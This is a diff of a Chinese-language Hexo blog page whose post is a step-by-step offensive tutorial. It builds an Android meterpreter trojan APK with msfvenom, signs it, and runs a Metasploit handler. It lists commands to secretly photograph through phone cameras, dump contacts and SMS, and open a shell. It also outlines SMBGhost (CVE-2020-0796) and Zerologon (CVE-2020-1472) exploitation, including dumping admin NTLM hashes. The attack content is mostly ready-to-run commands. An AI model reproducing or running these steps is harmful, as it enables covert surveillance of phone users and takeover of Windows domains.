@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="payload, Hexo">
+    <meta name="keywords" content="payload, q0o0p">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>payload | Hexo</title>
+    <title>payload | q0o0p</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -29,8 +29,8 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.0.2"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<meta name="generator" content="Hexo 5.0.2"><link rel="alternate" href="/atom.xml" title="q0o0p" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-dark.css" type="text/css">
 <link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
@@ -43,7 +43,7 @@
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Hexo</span>
+                    <span class="logo-span">q0o0p</span>
                 </a>
             </div>
             
@@ -194,7 +194,7 @@
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Hexo</div>
+        <div class="logo-name">q0o0p</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -575,14 +575,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2020-09-20
+                    2020-10-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    830
+                    1k
                 </div>
                 
 
@@ -606,20 +606,27 @@
             <div id="articleContent">
                 <p>#Android payload</p>
 <h2 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h2><p>打开终端，安装ufw防火墙，开启5555端口</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">sudo ufw allow 5555</span><br></pre></td></tr></tbody></table></figure>
-<h2 id="生成payload-apk文件"><a href="#生成payload-apk文件" class="headerlink" title="生成payload apk文件"></a>生成payload apk文件</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.220 LPORT=5555 R &gt; ./a.apk</span><br></pre></td></tr></tbody></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ufw
+<span class="token function">sudo</span> ufw <span class="token function">enable</span>
+<span class="token function">sudo</span> ufw allow 5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="生成payload-apk文件"><a href="#生成payload-apk文件" class="headerlink" title="生成payload apk文件"></a>生成payload apk文件</h2><ul>
+<li>reverse_tcp 方式注入<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p android/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>192.168.1.220 LPORT<span class="token operator">=</span>5555 R <span class="token operator">></span> ./a.apk   //kali IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+<li>reverse_https方式注入<pre class="line-numbers language-bash"><code class="language-bash">msfvenom -x 1.apk -p android/meterpreter/reverse_https LHOST<span class="token operator">=</span>xxxx LPORT<span class="token operator">=</span>xxx -o a.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ul>
 <p>生成apk后还需用到一下工具优化:<br>1.keytools (密钥、证书管理工具)<br>2.Jarsigner(jar签名、校验工具)<br>3.Zipalign(APK优化攻击)需安装</p>
 <hr>
 <ul>
 <li>首先使用keytools生成创建证书:</li>
 </ul>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -v -keystore apk-trojan-key.keystore -<span class="built_in">alias</span> newbie -keyalg RSA -keysize 1024 -validity 999</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash"><code class="language-bash">keytool -genkey -v -keystore apk-trojan-key.keystore -alias newbie -keyalg RSA -keysize 1024 -validity 999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>-v 显示密钥库中的证书详细信息<br>-k eystore 指定密钥库的名称<br>-alias 产生别名<br>-keyalg 指定密钥的算法(默认为DSA)<br>-keysize 指定密钥长度<br>-validity 指定创建的证书有效期多少天(默认90)</p>
 <hr>
 <ul>
 <li><p>然后使用jarsigner进行签名:</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore newbie.apk newbie</span><br></pre></td></tr></tbody></table></figure></li>
+<pre class="line-numbers language-bash"><code class="language-bash">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore newbie.apk newbie<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
 <li><p>verbose 签名/验证时输出详细信息</p>
 </li>
 <li><p>sigalg  签名算法的名称</p>
@@ -629,42 +636,68 @@
 <li><p>keystore 密钥库位置<br><code>进行签名文件+别名</code></p>
 </li>
 <li><p>使用-verify对文件签名验证</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verify -verbose newbie.apk</span><br></pre></td></tr></tbody></table></figure>
-
+<pre class="line-numbers language-BASH"><code class="language-BASH">jarsigner -verify -verbose newbie.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
 </ul>
 <hr>
 <ul>
-<li>使用Zipalign优化apk (缺少这一步可能导致部分手机会无法安装)<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipalign -v 4 newbie.apk  newbie1.apk</span><br></pre></td></tr></tbody></table></figure>
-
+<li>使用Zipalign优化apk (缺少这一步可能导致部分手机会无法安装)<pre class="line-numbers language-bash"><code class="language-bash">zipalign -v 4 newbie.apk  newbie1.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
 </ul>
 <hr>
-<h2 id="开始监听"><a href="#开始监听" class="headerlink" title="开始监听"></a>开始监听</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler //加载攻击模块</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp  //选择要使用的Payload</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.113</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line">show options  //查看需要设置的参数</span><br><span class="line"></span><br><span class="line">//注意被侵入对象需要给我们的木马文件一些权限，诸如访问电话，信息，录音，相机，手机存储等权限</span><br><span class="line">exploit  //执行</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="开始监听"><a href="#开始监听" class="headerlink" title="开始监听"></a>开始监听</h2><pre class="line-numbers language-bash"><code class="language-bash">msfconsole
 
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap -i 1//前置摄像头采集照片</span><br><span class="line">webcam_snap -i 2 //后置摄像头采集照片</span><br></pre></td></tr></tbody></table></figure>
+use exploit/multi/handler //加载攻击模块
+<span class="token keyword">set</span> payload android/meterpreter/reverse_tcp  //选择要使用的Payload
+<span class="token keyword">set</span> LHOST 192.168.0.113//这里的地址设置成我们刚才生成木马的IP地址（kali的ip）
+<span class="token keyword">set</span> LPORT 5555
+show options  //查看需要设置的参数
 
-<p>注意:<code>当有一会时间未及时操作便出现会连接超时，用户需再次点击木马文件，才能继续操作.</code></p>
+//注意被侵入对象需要给我们的木马文件一些权限，诸如访问电话，信息，录音，相机，手机存储等权限
+exploit  //开始执行漏洞 开始监听,等待手机上线<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">webcam_list 查看手机有多少个摄像头 这里显示是2个
+webcam_stream  //开启摄像头
+webcam_snap //隐秘拍照功能
+dump_contacts //导出电话号码
+dump_sms  //导出信息
+//可以输入?查看更多命令
+
+shell  //get shell
+
+webcam_snap -i 1//前置摄像头采集照片
+webcam_snap -i 2 //后置摄像头采集照片<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>session切换<pre class="line-numbers language-bash"><code class="language-bash">background    <span class="token comment" spellcheck="true">#后台运行当前session</span>
+sessions    <span class="token comment" spellcheck="true">#列出所有session</span>
+sessions -i Id   <span class="token comment" spellcheck="true">#选择某一个sessionID进入session</span>
+sessions -n Name -i Id    <span class="token comment" spellcheck="true">#给session重命名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+注意:<code>当有一会时间未及时操作便出现会连接超时，用户需再次点击木马文件，才能继续操作.</code></li>
+</ul>
 <hr>
-<h2 id="查看可以使用的payload类型"><a href="#查看可以使用的payload类型" class="headerlink" title="查看可以使用的payload类型"></a>查看可以使用的payload类型</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | more</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="查看可以使用的payload类型"><a href="#查看可以使用的payload类型" class="headerlink" title="查看可以使用的payload类型"></a>查看可以使用的payload类型</h2><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -l payloads <span class="token operator">|</span> <span class="token function">more</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <hr>
 <h1 id="windows-10-payload-CVE-2020-0796"><a href="#windows-10-payload-CVE-2020-0796" class="headerlink" title="windows 10 payload CVE-2020-0796"></a>windows 10 payload CVE-2020-0796</h1><p>直接拿shell</p>
 <h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> lport 3333</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.188.177  //靶机win10：192.168.188.177,靶机关闭defender防火墙</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure>
-
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><pre class="line-numbers language-bash"><code class="language-bash">msfconsole
+use exploit/multi/handler
+<span class="token keyword">set</span> payload windows/x64/meterpreter/bind_tcp
+<span class="token keyword">set</span> lport 3333
+<span class="token keyword">set</span> rhost 192.168.188.177  //靶机win10：192.168.188.177,靶机关闭defender防火墙
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>下载<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">POC</a></p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip win10IP</span><br></pre></td></tr></tbody></table></figure>
-
+<pre class="line-numbers language-bash"><code class="language-bash">python3 exploit.py -ip win10IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <hr>
 <h1 id="windows-CVE-2020-1472"><a href="#windows-CVE-2020-1472" class="headerlink" title="windows CVE-2020-1472"></a>windows CVE-2020-1472</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2019 (Server Core installation)<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p>
 <h2 id="exp地址"><a href="#exp地址" class="headerlink" title="exp地址"></a>exp地址</h2><p>github上的exp进行攻击，exp地址如下：<br><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
 <p>##</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py -n DESKTOP-1VU9SAK -t 10.10.135.211  //要输入计算机名-n  计算机名  -t  域控ip</span><br><span class="line"></span><br><span class="line">secretsdump.py -no-pass -just-dc 2k12vitcim<span class="variable">$@192</span>.168.139.147 //获取管理员ntlm <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">python zerologon_tester.py OWA2010SP3 10.10.135.211</span><br></pre></td></tr></tbody></table></figure>
+<pre class="line-numbers language-bash"><code class="language-bash">python3 cve-2020-1472-exploit.py -n DESKTOP-1VU9SAK -t 10.10.135.211  //要输入计算机名-n  计算机名  -t  域控ip
 
+secretsdump.py -no-pass -just-dc 2k12vitcim<span class="token variable">$@192</span>.168.139.147 //获取管理员ntlm <span class="token function">hash</span>
+
+python zerologon_tester.py OWA2010SP3 10.10.135.211<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>wmi获取shell权限</p>
 <hr>
-<p>参考:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/93536347">https://blog.csdn.net/qq_41453285/article/details/93536347</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e63006a24603">https://www.jianshu.com/p/e63006a24603</a></p>
+<p>参考:<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/93536347">https://blog.csdn.net/qq_41453285/article/details/93536347</a><br>android payload:<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e63006a24603">https://www.jianshu.com/p/e63006a24603</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aeolian/p/11003219.html">https://www.cnblogs.com/aeolian/p/11003219.html</a></p>
 <p>windows CVE-2020-1472<br><a target="_blank" rel="noopener" href="https://bbs.secgeeker.net/thread-1579-1-1.html">https://bbs.secgeeker.net/thread-1579-1-1.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/13678632.html">https://www.cnblogs.com/Yang34/p/13678632.html</a><br><a target="_blank" rel="noopener" href="http://www.hackdig.com/09/hack-134464.htm">http://www.hackdig.com/09/hack-134464.htm</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -709,7 +742,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/2020/08/18/payload/">http://yoursite.com/2020/08/18/payload/</a>
+                    <a href="http://q0o0p.top/2020/08/18/payload/">http://q0o0p.top/2020/08/18/payload/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1199,6 +1232,52 @@
     
 
     
+        <style>
+    .mvaline-card {
+        margin: 1.5rem auto;
+    }
+
+    .mvaline-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+</style>
+
+<div class="card mvaline-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="mvcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/minivaline/dist/MiniValine.min.js"></script>
+<script>
+    new MiniValine({
+        el: '#mvcomments',
+        appId: 'zhM0AOiqle17oPoE84CoYw1e-gzGzoHsz',
+        appKey: 'itmzT1JbXfAjVwMqDhGPzU45',
+        mode: 'DesertsP',
+        placeholder: 'Write a Comment',
+        pathname: window.location.pathname,
+        lang: '',
+        adminEmailMd5: 'de8a7aa53d07e6b6bceb45c64027763d',
+        tagMeta: ["管理员", "小伙伴", "访客"],
+        master: ["de8a7aa53d07e6b6bceb45c64027763d"],
+        friends: ["b5bd5d836c7a0091aa8473e79ed4c25e", "adb7d1cd192658a55c0ad22a3309cecf", "3ce1e6c77b4910f1871106cb30dc62b0", "cfce8dc43725cc14ffcd9fb4892d5bfc"],
+        math: true,
+        md: true,
+        enableQQ: false,
+        NoRecordIP: false,
+        visitor: true,
+        maxNest: 6,
+        pageSize: 6,
+        serverURLs: '',
+        emoticonUrl: ["https://cdn.jsdelivr.net/npm/alus@latest", "https://cdn.jsdelivr.net/gh/MiniValine/qq@latest", "https://cdn.jsdelivr.net/gh/MiniValine/Bilibilis@latest", "https://cdn.jsdelivr.net/gh/MiniValine/tieba@latest", "https://cdn.jsdelivr.net/gh/MiniValine/twemoji@latest", "https://cdn.jsdelivr.net/gh/MiniValine/weibo@latest"],
+    });
+</script>
+
+    
 
     
 
@@ -1487,7 +1566,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">4.7k</span>&nbsp;字
+                class="white-color">6k</span>&nbsp;字
             
             
             
